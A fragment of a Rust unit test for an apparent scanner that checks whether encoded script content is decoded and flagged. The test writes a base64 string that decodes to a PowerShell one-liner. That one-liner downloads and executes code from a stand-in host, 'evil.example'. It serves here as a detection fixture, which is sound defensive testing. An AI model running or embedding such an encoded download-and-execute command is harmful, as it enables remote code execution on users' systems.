...
mod tests {
    ...
    #[test]
    fn promotes_decoded_script_content_into_findings() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!(
            "projectx_decode_test_{}_sample.txt",
            std::process::id()
        ));
        std::fs::write(
            &path,
            b"aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2V2aWwuZXhhbXBsZScp",
        )
        .unwrap();

        let mut ctx = ScanContext::from_path(&path, ScanConfig::default()).unwrap();
        ctx.strings.values.push(
        ...
        assert!(!ctx.decoded_strings.is_empty());
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "DECODED_ACTIVE_CONTENT"));
